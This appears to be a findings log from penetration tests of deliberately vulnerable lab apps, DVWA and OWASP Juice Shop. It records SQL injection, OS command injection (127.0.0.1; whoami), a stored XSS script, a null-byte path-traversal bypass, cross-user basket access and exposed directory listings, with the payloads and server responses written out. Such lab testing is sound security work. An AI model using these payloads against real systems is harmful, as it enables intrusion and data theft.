findings.title: SQL Injection in DVWA sqli 'id' parameter (low)
findings.response_evidence: [security=low] TRUE payload `1' OR '1'='1` returned MULTIPLE seeded records/surnames: admin/admin, Gordon/Brown, Hack/Me, Pablo/Picasso, Bob/Smith (5 users). FALSE payload `1' AND '1'='2` returned ZERO records (User ID section empty, no name/surname output). Boolean-based SQLi confirmed.

findings.title: OS Command Injection on exec/ ip field (low)
request_sequence: POST /vulnerabilities/exec/ (session=dvwa_admin, security=low) form_data: ip=127.0.0.1; whoami & Submit=Submit
findings.response_evidence: [security=low] Payload ip=`127.0.0.1; whoami` executed. Response pre-block contained the ping output followed by the injected command result: "...rtt min/avg/max/mdev = 0.027/0.031/0.038/0.004 ms\nwww-data". The web-process identity `www-data` proves OS command injection.

findings.title: Stored XSS in guestbook message (low)
request_sequence: POST /vulnerabilities/xss_s/ (security=low) with mtxMessage=<script id="test_token">window.xss_flag=1</script>, txtName=canary, btnSign=Sign Guestbook
findings.response_evidence: [security=low] Stored canary rendered on the guestbook page (visible entry "Name: canary"). Authenticated browser navigation to /vulnerabilities/xss_s/ executed the stored script.
findings.browser_js_evidence: browser_eval_js("window.xss_flag") returned result: 1 — the stored <script id="test_token">window.xss_flag=1</script> executed in the browser context, confirming Stored XSS.

findings.title: Juice Shop Product-Search SQL Injection (UNION-based)
findings.response_evidence: Single quote q=qwert' -> HTTP 500 with body: 'Error: SQLITE_ERROR: near "'%'": syntax error'. 9-column UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9-- -> HTTP 200 JSON {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]} — injected constants 1-9 mapped into result columns, proving UNION injection succeeds.

findings.title: Juice Shop Login Authentication-Bypass SQL Injection
findings.response_evidence: HTTP 200 returning a valid authentication object for the first user: {"authentication":{"token":"[JWT issued]","bid":1,"umail":"admin@juice-sh.op"}}. The SQLi payload ' OR 1=1-- bypassed authentication and logged in as admin@juice-sh.op without valid credentials.

findings.title: Juice Shop Unauthenticated User-Feedback PII Exposure
findings.response_evidence: HTTP 200 WITHOUT authentication returning feedback records that disclose author email addresses in comments, e.g. id=4 UserId=21 comment ends with "(***ereum@juice-sh.op)" and id=1 UserId=1 comment ends with "(***in@juice-sh.op)". Additionally the UserId linkage (1,2,3,21) is exposed. One record (id=4) even leaks a wallet mnemonic. PII disclosed to unauthenticated clients.

findings.title: Confidential Acquisition Memo Exposed via Open /ftp/ Directory Listing
findings.response_evidence: (a) /ftp/ returns HTTP 200 browsable directory listing enumerating files including 'acquisitions.md 909 12/19/2023' alongside package.json.bak, incident-support.kdbx, etc. (b) GET /ftp/acquisitions.md returns HTTP 200 (text/markdown) with the confidential memo: '# Planned Acquisitions\n> This document is confidential! Do not distribute!\nOur company plans to acquire several competitors within the next year. This will have a significant stock market impact...' Retrieved unauthenticated.

findings.title: Open Directory Listing at /ftp/ Enumerates Sensitive Files
findings.response_evidence: HTTP 200 unauthenticated directory listing titled 'listing directory /ftp/' enumerating: quarantine, acquisitions.md (909 bytes), announcement_encrypted.md, coupons_2013.md.bak, eastere.gg, encrypt.pyc, incident-support.kdbx, legal.md, package.json.bak, suspicious_errors.yml. The listing discloses existence/sizes of confidential and backup files that should not be browsable.

findings.title: Cross-User Basket Access (BOLA/IDOR) on /rest/basket/{id}
request_sequence: GET http://juiceshop:3000/rest/basket/6 [juiceshop_acct1] -> own_basket_id=6 (UserId:22), item Apple Juice (1000ml) qty 3
findings.response_evidence: BOLA confirmed: Account 1 (acct1_bench, own_basket_id=6) basket #6 belongs to UserId 22 and contains distinct seeded item Apple Juice (1000ml), quantity 3 (BasketItem id 9). Authenticated as Account 2 (acct2_bench, own_basket_id=7), GET /rest/basket/6 returned HTTP 200 with identical data: {\"id\":6,\"UserId\":22,...\"name\":\"Apple Juice (1000ml)\"...\"quantity\":3}. acct2 successfully read acct1's basket contents cross-user with no authorization check on the path id parameter.

findings.title: Poison Null-Byte Path Traversal Bypass Exposes Restricted Backup File (package.json.bak)
findings.response_evidence: RAW restricted path GET /ftp/package.json.bak returned HTTP 403 with body: "Error: Only .md and .pdf files are allowed! ... at verify (/juice-shop/build/routes/fileServer.js:55:18)". Null-byte bypass GET /ftp/package.json.bak%2500.md returned HTTP 200 (content_type application/octet-stream) delivering the actual backup file: {"name":"juice-shop","version":"6.2.0-SNAPSHOT","description":"An intentionally insecure JavaScript Web Application","homepage":"http://owasp-juice.shop","author":"Björn Kimminich ...","dependencies":{"express":"~4.16","express-jwt":"0.1.3","sequelize":"~4","sqlite3":"~3.1.13",...}}. The URL-encoded null byte (%2500) followed by an allowed .md extension bypassed the extension allow-list filter, proving path traversal file disclosure. Both the 403 on the raw path and the 200-with-content via the bypass are demonstrated.

findings.title: Browsable Encryption-Keys Directory Exposes Sensitive Key Files (premium.key, jwt.pub)
request_sequence: GET http://juiceshop:3000/encryptionkeys/ (unauth, Accept: text/html,application/json) -> 200 directory listing
findings.response_evidence: GET /encryptionkeys/ returned HTTP 200 (text/html) with a browsable serve-index directory listing. Listing header: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified". Enumerated sensitive key file entries: "jwt.pub 248 12/19/2023 1:12:12 PM" and "premium.key 50 12/19/2023 1:12:12 PM". Directory links exposed: http://juiceshop:3000/encryptionkeys/jwt.pub and http://juiceshop:3000/encryptionkeys/premium.key. The directory is browsable without authentication and discloses both the JWT public key (jwt.pub) and the premium.key, confirming improper exposure of a sensitive directory.

findings.title: SQL Injection (medium) via numeric boolean on /vulnerabilities/sqli/
findings.response_evidence: [security=medium] Quotes escaped server-side, so numeric boolean used. TRUE `1 OR 1=1` returned 5 seeded records with surnames: admin, Brown, Me, Picasso, Smith. FALSE `1 AND 1=2` returned ZERO records. Behavioral boolean differential confirms SQLi. Page confirmed Security Level: medium.

findings.title: DVWA SQL Injection (HIGH) via out-of-band session-input vector
request_sequence: [Set security=high] GET /security.php (dvwa_admin) -> confirmed 'Security level is currently: high'
[TRUE case] POST /vulnerabilities/sqli/session-input.php (dvwa_admin) form_data: id=1' OR '1'='1' # & Submit=Submit
[TRUE case] GET /vulnerabilities/sqli/ (dvwa_admin) -> returns 5 seeded user records (surnames: admin, Brown, Me, Picasso, Smith)
[FALSE case] POST /vulnerabilities/sqli/session-input.php (dvwa_admin) form_data: id=1' AND '1'='2' # & Submit=Submit
findings.response_evidence:
[security=high] Out-of-band SQLi via session-input.php. The HIGH-level query appends LIMIT 1, so a trailing comment (#) is required to neutralize it. Boolean differential proven:
TRUE payload `1' OR '1'='1' #` (set via session-input.php, then GET /vulnerabilities/sqli/) returned 5 seeded user records with distinct surnames: admin, Brown, Me, Picasso, Smith.
FALSE payload `1' AND '1'='2' #` (same flow) returned ZERO user records — the /vulnerabilities/sqli/ response contained no First name/Surname output rows (visible_text showed only the page chrome and 'Click here to change your ID', no user data).
Differing record counts (5 vs 0) under attacker-controlled boolean logic confirms injectable SQL at security=high. Session ID echoed verbatim on session-input.php confirming injection string acceptance: "Session ID: 1' AND '1'='2' #".
